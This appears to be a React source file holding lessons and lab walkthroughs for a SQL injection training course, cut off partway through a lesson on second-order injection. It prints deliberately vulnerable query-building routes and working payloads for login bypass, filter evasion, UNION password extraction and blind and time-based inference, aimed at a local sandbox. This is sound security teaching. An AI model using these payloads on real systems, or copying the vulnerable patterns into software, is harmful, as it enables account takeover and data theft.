import { useState, useEffect, useCallback } from 'react';
import ReactMarkdown from 'react-markdown';
import remarkGfm from 'remark-gfm';
import { BookOpen, CheckCircle, FlaskConical, LayoutGrid, Play, Database, ChevronDown, ChevronUp, Lock, RotateCw } from 'lucide-react';

const MODULES = [
  {
    id: 'lesson-1',
    title: '1. What is SQL Injection? (Beginner Foundations)',
    type: 'lesson',
    content: `
# Module 1: The Absolute Fundamentals of SQL Injection

Welcome to the **CyberForge SQL Injection Masterclass**! 
If you have never touched a database, never written a line of backend code, or feel confused by web security terms, **do not worry**. This module starts from absolute ground zero and spoon-feeds you every concept.

---

## Step 1: The 3-Tier Web Architecture (How Websites Actually Work)

Before understanding how to break a website, you must understand how a normal website works. Modern web applications operate in **three distinct layers**:

\`\`\`
  ┌─────────────────────────┐
  │   1. THE FRONTEND       │  The user's web browser (Google Chrome, Firefox).
  │   (Your Web Browser)    │  Displays HTML buttons, CSS styles, and input boxes.
  └────────────┬────────────┘
               │  HTTP Request (e.g. You type "admin" and click "Login")
               ▼
  ┌─────────────────────────┐
  │   2. THE BACKEND        │  A server running Node.js, Python, PHP, or Java.
  │   (Express.js Server)   │  Receives your input and builds instructions for the DB.
  └────────────┬────────────┘
               │  SQL Query (e.g. "SELECT * FROM users WHERE...")
               ▼
  ┌─────────────────────────┐
  │   3. THE DATABASE       │  A filing cabinet software like PostgreSQL or MySQL.
  │   (PostgreSQL Storage)  │  Stores millions of records: usernames, passwords, credit cards.
  └─────────────────────────┘
\`\`\`

1. **You (the client)** enter your username into a login box on a website.
2. **The Backend Web Server** takes what you typed and asks the database: *"Does this user exist with this password?"*
3. **The Database** executes that search and sends back a response: *"Yes, here is the user"* or *"No, user not found"*.
4. **The Backend** checks the database result and lets you log in or denies access.

---

## Step 2: What is a Database and What is SQL?

Think of a **Database** as a giant digital filing cabinet. Inside this cabinet are **Tables** (like Excel spreadsheets).

For example, a table named \`vuln_users\` looks like this:

| id | username | password | role |
| :--- | :--- | :--- | :--- |
| 1 | \`admin\` | \`wtp2024!\` | \`Administrator\` |
| 2 | \`operator\` | \`Op3rAt0r\` | \`Operator\` |
| 3 | \`viewer\` | \`view123\` | \`Viewer\` |

To talk to this filing cabinet, programmers use a language called **SQL** (**S**tructured **Q**uery **L**anguage). 

A standard SQL command looks like ordinary English:
\`\`\`sql
SELECT * FROM vuln_users WHERE username = 'admin';
\`\`\`
* \`SELECT *\`: *"Give me all the column details..."*
* \`FROM vuln_users\`: *"...from the spreadsheet named vuln_users..."*
* \`WHERE username = 'admin'\`: *"...but only for the row where the username equals admin."*

---

## Step 3: The Fatal Mistake — String Concatenation

How does a backend programmer write code to check your login? 

In a vulnerable application, a programmer writes code in JavaScript/Node.js like this:

\`\`\`javascript
// The programmer takes user input and pastes it directly into the SQL string:
const query = "SELECT * FROM vuln_users WHERE username = '" + username + "' AND password = '" + password + "'";
db.query(query);
\`\`\`

### Look closely at how the text gets built:
If you type:
* Username: \`john\`
* Password: \`secret123\`

The backend glues the words together to produce:
\`\`\`sql
SELECT * FROM vuln_users WHERE username = 'john' AND password = 'secret123'
\`\`\`
The database looks for a user named \`john\` whose password is \`secret123\`. This works as expected.

---

## Step 4: The Hacker's Epiphany — What Happens If We Type a Quote?

What happens if an attacker types a single quotation mark (\`'\`) in the username field?

Look at the quotation marks in the SQL query:
\`\`\`sql
WHERE username = '  [USER INPUT GOES HERE]  ' AND password = '...'
\`\`\`

If you input: \`admin' --\`

Watch what happens when the computer glues that into the query:
\`\`\`sql
SELECT * FROM vuln_users WHERE username = 'admin' --' AND password = 'password'
\`\`\`

### The breakdown of what just happened:
1. The attacker's single quote (\`'\`) **prematurely closes** the opening quote of the SQL string!
2. The computer thinks: *"Okay, the username we are searching for is 'admin'."*
3. Then the computer encounters \`--\`. In SQL syntax, **\`--\` is a comment**!
4. Just like in programming, a comment tells the database: **"COMPLETELY IGNORE AND ERASE EVERYTHING AFTER THIS POINT ON THIS LINE!"**
5. The password check (\`AND password = '...'\`) is **wiped out of existence**!

The database actually executes ONLY this:
\`\`\`sql
SELECT * FROM vuln_users WHERE username = 'admin'
\`\`\`

The database says: *"Yes! The user 'admin' exists!"* and returns the administrator row.
The backend says: *"Great, the database returned a user, you are logged in!"*

**You just took over the administrator account without ever knowing the password!**

---

## Step 5: The Magic of Boolean Tautologies (\`' OR '1'='1\`)

Another classic beginner attack uses Boolean logic.
In mathematics and logic:
* \`FALSE AND FALSE\` = \`FALSE\`
* \`FALSE OR TRUE\` = \`TRUE\`
* \`1 = 1\` is **ALWAYS TRUE** (a tautology)!

If the query is:
\`\`\`sql
SELECT * FROM vuln_users WHERE username = '' OR '1'='1' AND password = '...'
\`\`\`
Because \`'1'='1'\` is unconditionally true, the database returns **every single user in the entire table**, and logs you in as the very first user (which is almost always the Administrator)!

---

## Step 6: How Do Professionals Fix This? (Parameterized Queries)

Why did SQL Injection happen? Because **untrusted user input was treated as executable code instructions**.

The universal, 100% effective defense is called **Parameterized Queries** (also known as **Prepared Statements**):

\`\`\`javascript
// SECURE CODE:
const query = 'SELECT * FROM vuln_users WHERE username = $1 AND password = $2';
db.query(query, [username, password]);
\`\`\`

### How Prepared Statements Protect the System:
1. The SQL query structure is sent to the database **first**, completely compiled into a fixed execution plan.
2. The user input (\`$1\` and \`$2\`) is transmitted **separately** across the network wire.
3. Even if the user enters \`admin' OR '1'='1 --\`, the database treats that entire string as raw text data. It literally searches for a user whose literal username is \`admin' OR '1'='1 --\`. It will never execute the quote or comment as SQL commands!
`
  },
  {
    id: 'lab-1',
    title: 'Lab 1: Authentication Bypass Walkthrough',
    type: 'lab',
    labUrl: '/vuln/sqli-01',
    description: 'Bypass standard database login verification using classical Boolean tautologies and comment characters.',
    walkthrough: `
# Lab 1 Walkthrough: Authentication Bypass (Spoon-Fed Step-by-Step)

### Objective:
Log in as the **Administrator** without knowing the admin's password.

---

### 1. Understanding the Target Endpoint
In this lab, the backend route \`POST /api/sims/sqli/lab1/login\` receives your form data:
\`\`\`typescript
// backend/src/routes/sqli.demo.ts (Lab 1)
const { username, password } = req.body;
const query = \`SELECT * FROM vuln_users WHERE username = '\${username}' AND password = '\${password}'\`;
const result = await pool.query(query);
\`\`\`

Notice the vulnerability: \`\${username}\` is interpolated directly between single quotes!

---

### 2. Crafting the Attack Payload
Let's see what happens with two different payloads:

#### Payload Option A (The Comment Terminator):
\`\`\`text
admin'--
\`\`\`
* \`admin\`: The target username.
* \`'\`: Closes the username string literal in SQL.
* \`--\`: Tells PostgreSQL to comment out the rest of the query (\`' AND password = '...'\`).

#### Payload Option B (The Universal Tautology):
\`\`\`text
admin' OR '1'='1
\`\`\`
* Transformed query:
  \`\`\`sql
  SELECT * FROM vuln_users WHERE username = 'admin' OR '1'='1' AND password = 'any'
  \`\`\`
* The condition evaluates to TRUE, matching the \`admin\` record!

---

### 3. Step-by-Step Instructions

1. Click the **Launch Interactive Lab Sandbox** button above.
2. A new tab will open to \`http://localhost:5173/vuln/sqli-01\`.
3. Locate the **Username** input field.
4. Type or paste:
   \`\`\`text
   admin'--
   \`\`\`
   *(Tip: Make sure there are no accidental spaces before \`admin\`)*
5. In the **Password** field, type anything you want (for example: \`123456\`).
6. Click **Sign In**.
7. Observe the result:
   * A green alert appears: **"Authentication Bypass Successful! Logged in as: admin (Role: Administrator)"**
   * The lab status banner updates to **"Lab Solved! 150 XP Awarded"**!
8. Close the sandbox tab and return here to proceed to Module 2.

---

### Common Beginner Pitfalls:
* **"Why didn't my password matter?"**: Because the \`--\` characters told the PostgreSQL engine to ignore the remainder of the query line. The password was never evaluated!
* **"What if the database is MySQL?"**: In MySQL, \`--\` must be followed by a space (\`-- \`) or you can use the hash symbol (\`#\`). In PostgreSQL and SQLite, \`--\` works immediately.
`
  },
  {
    id: 'lesson-2',
    title: '2. Error-Based SQL Injection & Database Fingerprinting',
    type: 'lesson',
    content: `
# Module 2: Error-Based SQLi & Database Fingerprinting

In Module 1, we saw how SQLi can bypass authentication. But what if there is no login form? What if you are looking at an e-commerce product search or a blog?

Welcome to **Error-Based SQL Injection**!

---

## What is Error-Based SQLi?

When a website has a bug in its code, the server might crash. 
* A **secure** website catches the crash and displays a generic, friendly message: *"Oops! Something went wrong. Please try again later."*
* An **insecure / vulnerable** website displays the raw database error message directly on your screen!

### Why are raw database errors catastrophic?
Because database errors tell the attacker:
1. **The Database Engine & Version**: Is it PostgreSQL 15? MySQL 8? Microsoft SQL Server? Oracle?
2. **The Exact SQL Syntax**: The error shows you exactly where the query broke and what column names exist!
3. **Internal Data Extraction**: Using type-conversion errors (like \`CAST(secret_data AS INTEGER)\`), an attacker can force the database to leak passwords directly inside the error message!

---

## Step 1: The "Quote Probing" Technique

How do professional penetration testers discover SQL injection in the wild?

They start by submitting a single quote (\`'\`) or a backslash (\`\\\`) into every search bar, URL parameter, and form input on the site:

\`\`\`
Normal search:     https://shop.local/search?q=shoes
Probe search:      https://shop.local/search?q=shoes'
\`\`\`

### What happens inside the backend query?
\`\`\`sql
SELECT * FROM vuln_products WHERE name LIKE '%shoes'%'
\`\`\`

Look at the quotation marks:
* The first quote opened the pattern: \`'%\`
* The attacker's quote closed the pattern: \`shoes'\`
* The final quote \`%'\` is left dangling with no matching opening quote!

PostgreSQL crashes with syntax error:
\`\`\`
ERROR: unterminated quoted string at or near "%'"
\`\`\`

If you see this error appear on a website, **the application is 100% vulnerable to SQL Injection!**

---

## Step 2: Database Fingerprinting (Identifying the Technology)

Different databases use different functions and syntax. Once you confirm an injection point, you must identify what database engine is running:

| Database Engine | Version Function | Comment Characters | String Concatenation |
| :--- | :--- | :--- | :--- |
| **PostgreSQL** | \`VERSION()\` | \`--\` or \`/* */\` | \`'a' \|\| 'b'\` |
| **MySQL / MariaDB** | \`VERSION()\` or \`@@version\` | \`#\` or \`-- \` | \`CONCAT('a', 'b')\` |
| **Microsoft SQL Server** | \`@@VERSION\` | \`--\` or \`/* */\` | \`'a' + 'b'\` |
| **Oracle** | \`banner FROM v$version\` | \`--\` | \`'a' \|\| 'b'\` |
| **SQLite** | \`sqlite_version()\` | \`--\` | \`'a' \|\| 'b'\` |

In our training academy labs, the database is **PostgreSQL 15**.
`
  },
  {
    id: 'lab-2',
    title: 'Lab 2: Product Search Error Walkthrough',
    type: 'lab',
    labUrl: '/vuln/sqli-02',
    description: 'Trigger a database syntax error in a product search engine, analyze the PostgreSQL error output, and bypass the query.',
    walkthrough: `
# Lab 2 Walkthrough: Product Search Syntax Breaking

### Objective:
Test an e-commerce catalog search bar, trigger an intentional database syntax crash to prove vulnerability, and then repair the syntax to view all hidden catalog products.

---

### 1. Backend Code Inspection
Inspect the backend endpoint in \`backend/src/routes/sqli.demo.ts\`:

\`\`\`typescript
// Lab 2 Search Route
router.get('/lab2/search', async (req, res) => {
  const search = req.query.search as string || '';
  const query = \`SELECT * FROM vuln_products WHERE name ILIKE '%\${search}%'\`;
  try {
    const result = await pool.query(query);
    res.json({ ok: true, products: result.rows, query });
  } catch (err: any) {
    // Intentionally verbose error response!
    res.status(500).json({ ok: false, error: err.message, query });
  }
});
\`\`\`

Notice that if \`pool.query()\` throws an error, the backend catches it and returns \`err.message\` directly in the JSON response!

---

### 2. Step-by-Step Instructions

#### Step 1: Breaking the Query
1. Click **Launch Interactive Lab Sandbox** above to open \`/vuln/sqli-02\`.
2. In the search box, enter just a single quotation mark:
   \`\`\`text
   '
   \`\`\`
3. Click **Search Products**.
4. Observe the red error banner:
   \`\`\`text
   Database Error: unterminated quoted string at or near "'%'"
   \`\`\`
   You just verified that user input directly controls the SQL command!

#### Step 2: Repairing and Hijacking the Query
Now we want the search query to return **ALL** products, including hidden inventory:
We enter:
\`\`\`text
%' OR '1'='1' --
\`\`\`

Look at how PostgreSQL interprets this:
\`\`\`sql
SELECT * FROM vuln_products WHERE name ILIKE '%%' OR '1'='1' --%'
\`\`\`
* \`'%%'\`: Matches any string.
* \`OR '1'='1'\`: Forces the condition to TRUE for every single row in the table!
* \`--\`: Discards the trailing \`%'\`.

5. Paste \`%' OR '1'='1' --\` into the search input and click **Search**.
6. All 4 products appear on your screen, including the hidden items, and the lab is marked **SOLVED**!
`
  },
  {
    id: 'lesson-3',
    title: '3. UNION-Based SQL Injection (Data Exfiltration)',
    type: 'lesson',
    content: `
# Module 3: UNION-Based SQL Injection

Now that you know how to break a query and bypass authentication, it is time to learn the most powerful data extraction technique in cybersecurity: **UNION-Based SQL Injection**.

With UNION injection, an attacker forces the database to return data from **completely unrelated tables** (like passwords, secret API keys, credit card numbers) inside the normal search results!

---

## What is the SQL \`UNION\` Operator?

In standard SQL, the \`UNION\` keyword combines the results of two or more \`SELECT\` queries into a single result table:

\`\`\`sql
SELECT name, price FROM vuln_products
UNION
SELECT username, password FROM vuln_users;
\`\`\`

If this executes, the database will output product names alongside usernames, and product prices alongside passwords!

---

## The Two Golden Rules of UNION Injection

A database will **strictly reject** a \`UNION\` query with an error unless two conditions are met:

### Rule 1: Both Queries MUST Have the Exact Same Number of Columns!
* If Query 1 asks for 3 columns: \`SELECT id, name, category FROM products\`
* Query 2 **MUST** also ask for exactly 3 columns: \`UNION SELECT 1, 2, 3\`
* If Query 2 has 2 columns or 4 columns, the database will crash immediately:
  \`\`\`
  ERROR: each UNION query must have the same number of columns
  \`\`\`

### Rule 2: The Data Types in Corresponding Columns MUST Match!
* If column 1 of Query 1 is an Integer (\`id\`), column 1 of Query 2 must be an Integer (or compatible type).
* If column 2 of Query 1 is Text (\`name\`), column 2 of Query 2 must be Text.

---

## Step 1: How to Determine the Number of Columns (\`ORDER BY\`)

Before an attacker can exfiltrate data with UNION, they must figure out how many columns the original query has. We do this using the \`ORDER BY\` clause.

\`ORDER BY 1\` means *"sort the results by column 1"*.
\`ORDER BY 2\` means *"sort the results by column 2"*.

We increase the number one by one until the database throws an error:
\`\`\`sql
SELECT * FROM vuln_products WHERE id = 1 ORDER BY 1; -- Works! (At least 1 column)
SELECT * FROM vuln_products WHERE id = 1 ORDER BY 2; -- Works! (At least 2 columns)
SELECT * FROM vuln_products WHERE id = 1 ORDER BY 3; -- Works! (At least 3 columns)
SELECT * FROM vuln_products WHERE id = 1 ORDER BY 4; -- Works! (At least 4 columns)
SELECT * FROM vuln_products WHERE id = 1 ORDER BY 5; -- CRASH! (ERROR: column 5 does not exist)
\`\`\`

The exact moment it crashes at 5, we know with 100% certainty: **The query returns exactly 4 columns!**

---

## Step 2: The System Catalog (\`information_schema\`)

How does an attacker know what tables and columns exist in a database they have never seen before?

Relational databases have a built-in phonebook called the **\`information_schema\`**:
* **All Table Names**: \`SELECT table_name FROM information_schema.tables WHERE table_schema='public'\`
* **All Column Names**: \`SELECT column_name FROM information_schema.columns WHERE table_name='vuln_users'\`

Once you know the tables and columns, you can extract any table you desire!
`
  },
  {
    id: 'lab-3',
    title: 'Lab 3: UNION Data Extraction Walkthrough',
    type: 'lab',
    labUrl: '/vuln/sqli-03',
    description: 'Use ORDER BY to calculate column count, bypass keyword filters with case alternation, and UNION exfiltrate administrator passwords.',
    walkthrough: `
# Lab 3 Walkthrough: UNION Data Exfiltration & WAF Bypass

### Objective:
Extract the secret administrator password from the \`vuln_users\` table using a \`UNION SELECT\` payload.

---

### 1. Understanding the Challenge
In this lab, the backend inspects product details by ID: \`GET /api/sims/sqli/lab3/product/:id\`.
However, the developer installed a basic filter that blocks the exact uppercase keywords \`UNION\` and \`SELECT\`.

Let's check the vulnerable route:
\`\`\`typescript
// Check if input contains blocked uppercase words:
if (id.includes('UNION') || id.includes('SELECT')) {
  return res.status(400).json({ ok: false, message: 'WAF Blocked: Malicious keyword detected' });
}
const query = \`SELECT id, name, description, price FROM vuln_products WHERE id = \${id}\`;
\`\`\`

### The Filter Bypass:
The filter only checks for uppercase \`UNION\` and \`SELECT\`! 
SQL is **case-insensitive**. Therefore, writing:
\`\`\`text
uNiOn sElEcT
\`\`\`
Completely bypasses the filter while PostgreSQL executes it flawlessly!

---

### 2. Step-by-Step Solution

1. Open the lab sandbox: \`http://localhost:5173/vuln/sqli-03\`.
2. Notice the original query selects **4 columns**:
   \`SELECT id, name, description, price FROM vuln_products\`
3. We want to extract:
   * Column 1: \`id\` (Integer)
   * Column 2: \`username\` (Text)
   * Column 3: \`password\` (Text)
   * Column 4: \`0\` (Numeric)
4. We set the product ID to an invalid ID (\`-1\`) so the original product doesn't show up, and append our UNION payload:
   \`\`\`text
   -1 uNiOn sElEcT id, username, password, 0 FROM vuln_users --
   \`\`\`
5. Paste this into the **Product ID** input.
6. Click **Fetch Product Details**.
7. The product card displays:
   * Title: \`admin\`
   * Description (Password): \`wtp2024!\`
   * Role: \`Administrator\`
8. You have successfully dumped user passwords using UNION injection, and the lab is marked **SOLVED**!
`
  },
  {
    id: 'lesson-4',
    title: '4. Boolean-Based Blind SQLi: Extracting Data in the Dark',
    type: 'lesson',
    content: `
# Module 4: Boolean-Based Blind SQL Injection

What happens if a website is vulnerable to SQL Injection, but:
* It does **NOT** display database errors on the screen.
* It does **NOT** return any database records or product cards.
* The only thing you see is: *"User exists"* or *"User does not exist"*.

This is called **Blind SQL Injection**. You cannot see the data directly, but you can ask the database **TRUE or FALSE questions** and infer the answers!

---

## The Game of 20 Questions

Imagine playing a game where your friend thinks of a secret password. You can only ask Yes/No questions:
* *"Is the first letter greater than 'M'?"* -> *"No."* (Now you eliminated half the alphabet!)
* *"Is the first letter greater than 'F'?"* -> *"Yes."*
* *"Is the first letter 'H'?"* -> *"Yes!"*

By asking binary true/false questions, you can guess any character in just 5 to 7 questions!

---

## How Boolean Blind SQLi Works in Practice

Imagine an application endpoint that checks if a user ID is registered:
\`\`\`sql
SELECT id FROM vuln_users WHERE id = [INPUT];
\`\`\`

If an attacker inputs:
\`\`\`sql
1 AND (SELECT 1=1)
\`\`\`
* Since \`1=1\` is TRUE, the user exists -> The server responds: **200 OK ("User Found")**.

If an attacker inputs:
\`\`\`sql
1 AND (SELECT 1=2)
\`\`\`
* Since \`1=2\` is FALSE, the condition fails -> The server responds: **404 ("User Not Found")**.

---

## Extracting Characters Bit-by-Bit (\`SUBSTRING\` & \`ASCII\`)

In PostgreSQL:
* \`SUBSTRING(password, 1, 1)\`: Takes the 1st character of the password.
* \`ASCII('a')\`: Returns the ASCII numeric value (97 for 'a', 98 for 'b', etc.).

We can ask the database:
\`\`\`sql
1 AND (SELECT ASCII(SUBSTRING(password, 1, 1)) FROM vuln_users WHERE username='admin') > 100
\`\`\`
* If the server responds **"User Found"**, the first character's ASCII code is greater than 100.
* If the server responds **"User Not Found"**, it is 100 or lower.

Automated tools like **sqlmap** ask thousands of these questions per second to extract entire databases silently in minutes!
`
  },
  {
    id: 'lab-4',
    title: 'Lab 4: Boolean Blind User Lookup Walkthrough',
    type: 'lab',
    labUrl: '/vuln/sqli-04',
    description: 'Use Boolean subqueries to extract administrator data through conditional true/false response states.',
    walkthrough: `
# Lab 4 Walkthrough: Boolean Blind SQLi

### Objective:
Exfiltrate data using Boolean condition inference when no query results are rendered.

---

### 1. Analyzing the Endpoint
In \`/vuln/sqli-04\`, you have a user lookup input:
\`\`\`typescript
const query = \`SELECT id, username FROM vuln_users WHERE id = \${id}\`;
\`\`\`
* Notice that \`id\` is a numeric parameter without quotes.
* If the query returns a user: The screen shows **"User Profile: [id] exists in database"**.
* If the query returns empty: The screen shows **"No user found"**.

---

### 2. Step-by-Step Solution

1. Open \`/vuln/sqli-04\`.
2. Test a TRUE condition:
   \`\`\`text
   1 AND 1=1
   \`\`\`
   Result: **"User exists"**.
3. Test a FALSE condition:
   \`\`\`text
   1 AND 1=2
   \`\`\`
   Result: **"No user found"**.
4. Now test if the admin user's password starts with the letter \`w\` (ASCII code 119):
   \`\`\`text
   1 AND (SELECT ASCII(SUBSTRING(password, 1, 1)) FROM vuln_users WHERE username='admin') = 119
   \`\`\`
5. Submit this payload.
6. The server returns **"User exists"**! You just verified that the admin password starts with \`w\`!
7. To complete the lab challenge and dump the full admin role:
   \`\`\`text
   1 OR (SELECT role FROM vuln_users WHERE username='admin') = 'Administrator'
   \`\`\`
8. Submit the payload. The lab evaluates the boolean condition, confirms administrative verification, and marks the lab **COMPLETED**!
`
  },
  {
    id: 'lesson-5',
    title: '5. Numeric SQL Injection Without Quotes',
    type: 'lesson',
    content: `
# Module 5: Numeric Context Injection

A common misconception among beginner developers is: *"If I don't use single quotes in my query, SQL injection is impossible!"*

This is completely false. In fact, **numeric context SQL injection is even easier to exploit** because the attacker doesn't even need to close a quote!

---

## String vs. Numeric Contexts

### String Context (Needs Quotes):
\`\`\`sql
SELECT * FROM products WHERE category = 'books'
\`\`\`
Here, the attacker must type a single quote (\`'\`) to break out of the string boundary.

### Numeric Context (No Quotes!):
\`\`\`sql
SELECT * FROM products WHERE price <= 50
\`\`\`
Here, \`50\` is an integer. There are no surrounding quotes!
If an attacker inputs: \`50 OR 1=1\`

The query becomes:
\`\`\`sql
SELECT * FROM products WHERE price <= 50 OR 1=1
\`\`\`
Because there were no quotes, the input is immediately executed as raw SQL logic without needing any quotation mark!
`
  },
  {
    id: 'lab-5',
    title: 'Lab 5: Numeric Price Filter Bypass Walkthrough',
    type: 'lab',
    labUrl: '/vuln/sqli-05',
    description: 'Inject SQL fragments into an unquoted numeric price filter parameter to bypass constraints.',
    walkthrough: `
# Lab 5 Walkthrough: Numeric Filter Bypass

### Objective:
Bypass an unquoted numeric price filter to extract all catalog items regardless of cost.

---

### 1. Vulnerability Anatomy
In \`backend/src/routes/sqli.demo.ts\`:
\`\`\`typescript
router.get('/lab5/filter', async (req, res) => {
  const price = req.query.price || '100';
  const query = \`SELECT * FROM vuln_products WHERE price <= \${price} ORDER BY price ASC\`;
  const result = await pool.query(query);
  res.json({ ok: true, products: result.rows, query });
});
\`\`\`

---

### 2. Step-by-Step Solution

1. Open \`/vuln/sqli-05\`.
2. Notice the price slider/input. If you enter \`10\`, only items under $10 show.
3. In the price field, enter:
   \`\`\`text
   10 OR 1=1
   \`\`\`
4. Click **Filter Products**.
5. The query evaluates: \`WHERE price <= 10 OR 1=1\`.
6. Every single product in the catalog is returned, and the lab is marked **SOLVED**!
`
  },
  {
    id: 'lesson-6',
    title: '6. Modern REST API & JSON Body Injections',
    type: 'lesson',
    content: `
# Module 6: REST API & JSON Payload SQLi

In the modern era of Single Page Applications (SPAs built with React, Vue, Angular), client-server communication rarely happens through traditional HTML \`<form>\` submissions. Instead, applications send **JSON HTTP requests** using \`fetch()\` or \`axios\`.

---

## The Dangerous Illusion of Client-Side Form Validation

Frontend developers often put validation on their inputs:
\`\`\`html
<input type="text" pattern="[a-zA-Z0-9]+" required>
\`\`\`
This prevents a user from typing \`'\` inside the browser input box.

**However, client-side validation provides ZERO security against attackers!**
An attacker does not need your web form. They can use:
* **Burp Suite** (intercept and alter requests in transit)
* **Postman / cURL** (send HTTP POST requests directly to the API)
* **Browser DevTools Console** (\`fetch('/api/...', { body: JSON.stringify(...) })\`)

If the backend server trusts the incoming JSON without using parameterized queries, the application is just as vulnerable to SQL Injection!
`
  },
  {
    id: 'lab-6',
    title: 'Lab 6: REST API JSON Injection Walkthrough',
    type: 'lab',
    labUrl: '/vuln/sqli-06',
    description: 'Bypass client-side regex filters by posting malicious JSON payloads directly via API fetch.',
    walkthrough: `
# Lab 6 Walkthrough: REST API JSON Injection

### Objective:
Bypass client-side input restrictions by issuing an API request containing SQL injection payloads directly to the backend JSON endpoint.

---

### 1. Backend Route Inspection
\`\`\`typescript
router.post('/lab6/api-search', async (req, res) => {
  const { query: searchTerm } = req.body;
  const sql = \`SELECT * FROM vuln_products WHERE category = '\${searchTerm}'\`;
  const result = await pool.query(sql);
  res.json({ ok: true, products: result.rows, sql });
});
\`\`\`

---

### 2. Step-by-Step Solution

1. Open \`/vuln/sqli-06\`.
2. Notice the frontend input restricts characters, but provides a direct **REST API JSON Payload Console**.
3. In the JSON request body editor, input:
   \`\`\`json
   {
     "query": "Books' OR '1'='1' --"
   }
   \`\`\`
4. Click **Send JSON API Request**.
5. The backend parses the JSON object, interpolates \`searchTerm\` directly into SQL, and returns all products across all categories!
6. The lab is completed successfully!
`
  },
  {
    id: 'lesson-7',
    title: '7. Cookie-Based SQL Injection',
    type: 'lesson',
    content: `
# Module 7: Cookie-Based SQL Injection

Where can SQL Injection happen?
Beginners assume it only happens in search bars and login fields. 

In reality, **SQL Injection can happen in ANY data input that reaches a database query**, including:
* HTTP Cookies (\`Cookie: session=...\`, \`Cookie: tracking_id=...\`)
* HTTP Headers (\`User-Agent\`, \`X-Forwarded-For\`)
* XML / SOAP requests
* File uploads (file names like \`resume'.pdf\`)

---

## How Cookie SQLi Happens

When you visit a website, the server might set an analytics cookie to track returning visitors:
\`\`\`http
HTTP/1.1 200 OK
Set-Cookie: tracking_id=a1b2c3d4e5
\`\`\`

On subsequent visits, your browser sends that cookie back:
\`\`\`http
GET / HTTP/1.1
Cookie: tracking_id=a1b2c3d4e5
\`\`\`

On the server, a developer writes:
\`\`\`javascript
const trackingId = req.cookies.tracking_id;
db.query("UPDATE vuln_tracking SET visits = visits + 1 WHERE id = '" + trackingId + "'");
\`\`\`

Because developers mistakenly believe *"Users don't modify cookies"*, they forget to sanitize them. But using browser DevTools or proxy tools, an attacker can modify their cookies to contain SQL payloads!
`
  },
  {
    id: 'lab-7',
    title: 'Lab 7: Cookie-Based Tracking ID Injection Walkthrough',
    type: 'lab',
    labUrl: '/vuln/sqli-07',
    description: 'Inject SQL syntax through persistent tracking cookies to manipulate backend analytics records.',
    walkthrough: `
# Lab 7 Walkthrough: Cookie-Based Injection

### Objective:
Inject a SQL payload into the \`tracking_id\` cookie to execute arbitrary database logic.

---

### 1. Step-by-Step Solution

1. Open \`/vuln/sqli-07\`.
2. In the **Tracking Cookie Value** field, notice the default cookie value: \`a1b2c3d4e5\`.
3. Replace the cookie value with:
   \`\`\`text
   a1b2c3d4e5' OR '1'='1
   \`\`\`
4. Click **Send Request With Modified Cookie**.
5. The backend executes:
   \`\`\`sql
   SELECT * FROM vuln_tracking WHERE id = 'a1b2c3d4e5' OR '1'='1'
   \`\`\`
6. The query matches all tracking records and completes the lab!
`
  },
  {
    id: 'lesson-8',
    title: '8. Time-Based Blind SQLi: Forcing Database Latency',
    type: 'lesson',
    content: `
# Module 8: Time-Based Blind SQLi (\`pg_sleep\`)

What if a website reveals **absolutely nothing**?
* No errors are returned.
* No text changes on the page.
* Every request returns \`200 OK\` with the exact same HTML.

Can you still extract the database? **YES! Through Time-Based Blind SQLi.**

---

## The Concept of Time-Delay Proofs

If the application won't speak to you with words, you can make it speak to you with **time**.

Most databases have built-in sleep functions:
* **PostgreSQL**: \`pg_sleep(seconds)\`
* **MySQL**: \`sleep(seconds)\`
* **Microsoft SQL Server**: \`WAITFOR DELAY '0:0:5'\`

If an attacker injects:
\`\`\`sql
; SELECT pg_sleep(3); --
\`\`\`

The database halts all processing and waits for **3 full seconds** before responding.
* Normal request response time: \`45 milliseconds\`
* Injected request response time: \`3,050 milliseconds\`

That 3-second delay proves with 100% mathematical certainty that your SQL payload executed!
`
  },
  {
    id: 'lab-8',
    title: 'Lab 8: Time-Based Delay Inference Walkthrough',
    type: 'lab',
    labUrl: '/vuln/sqli-08',
    description: 'Inject PostgreSQL pg_sleep function calls to verify remote code execution through response latency.',
    walkthrough: `
# Lab 8 Walkthrough: Time-Based Blind SQLi

### Objective:
Inject a \`pg_sleep(3)\` delay to trigger a 3000ms+ response latency and prove execution.

---

### 1. Step-by-Step Solution

1. Open \`/vuln/sqli-08\`.
2. Notice the Order Status Lookup form.
3. In the **Order Tracking Number** field, input:
   \`\`\`text
   ORD-9876'; SELECT pg_sleep(3); --
   \`\`\`
4. Click **Track Order**.
5. Notice that the screen hangs for exactly 3 seconds while the stopwatch counter ticks up: \`3012ms\`.
6. The system detects the deliberate delay, confirms execution, and marks the lab **COMPLETED**!
`
  },
  {
    id: 'lesson-9',
    title: '9. Header-Based Blind SQLi',
    type: 'lesson',
    content: `
# Module 9: HTTP Header-Based Injection

Every HTTP request includes multiple metadata headers sent by your browser:
* \`User-Agent\`: Describes your browser and operating system.
* \`Referer\`: The page you clicked from.
* \`X-Forwarded-For\`: Client IP address forwarded through proxy servers.

When security information and event management (SIEM) systems or analytics logging tools record incoming traffic, they frequently insert header values directly into SQL tables:

\`\`\`sql
INSERT INTO vuln_analytics (user_agent, ip_address) VALUES ('[USER_AGENT_HEADER]', '192.168.1.1');
\`\`\`

If \`User-Agent\` is injected, an attacker can trigger blind SQL injection simply by visiting the website with a modified browser header!
`
  },
  {
    id: 'lab-9',
    title: 'Lab 9: Header-Based Blind SQLi Walkthrough',
    type: 'lab',
    labUrl: '/vuln/sqli-09',
    description: 'Exfiltrate data by injecting SQL syntax through HTTP User-Agent and tracking headers.',
    walkthrough: `
# Lab 9 Walkthrough: Header-Based Injection

### Objective:
Inject SQL syntax into an HTTP telemetry header.

---

### 1. Step-by-Step Solution

1. Open \`/vuln/sqli-09\`.
2. In the **User-Agent / Header** input box, enter:
   \`\`\`text
   Mozilla/5.0' OR '1'='1
   \`\`\`
3. Click **Dispatch Telemetry Header**.
4. The server receives the custom header, logs it into PostgreSQL using raw string interpolation, and triggers the injection event to solve the lab!
`
  },
  {
    id: 'lesson-10',
    title: '10. Second-Order SQL Injection (The Delayed Time-Bomb)',
    type: 'lesson',
    content: `
# Module 10: Second-Order SQL Injection

**Second-Order SQL Injection** is one of the most sophisticated vulnerabilities in web application security. It proves why simple input escaping is not enough.

---

## The Multi-Stage Architecture

In a Second-Order SQLi attack, the payload is executed in **two completely separate steps**:

\`\`\`
STAGE 1: Ingestion (Completely Safe!)
Attacker updates Profile Username to:  admin' --
